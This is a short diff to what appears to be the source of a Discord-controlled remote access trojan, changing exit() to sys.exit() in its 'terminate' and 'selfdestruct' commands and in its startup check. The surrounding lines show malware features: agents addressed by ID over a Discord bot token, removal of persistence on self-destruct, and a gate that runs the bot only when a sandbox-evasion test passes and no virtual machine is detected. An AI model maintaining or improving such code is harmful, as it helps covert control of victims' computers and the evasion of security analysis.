@@ -403,7 +403,7 @@ async def terminate(context):
         my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
         await context.message.channel.send(embed=my_embed)
         await client.close()        
-        exit()
+        sys.exit()
     else:
         pass
 
@@ -423,7 +423,7 @@ async def selfdestruct(context):
             my_embed = discord.Embed(title=f"Self-Destruction on Agent#{ID} Completed Succesfully", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
             await client.close()        
-            exit()
+            sys.exit()
 
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while removing Agent#{ID} persistence:\n{e}", color=0xFF0000)
@@ -490,4 +490,4 @@ if sandboxevasion.test() == True and isVM() == False:
 
     client.run(BOT_TOKEN)
 else:
-    exit()
+    sys.exit()
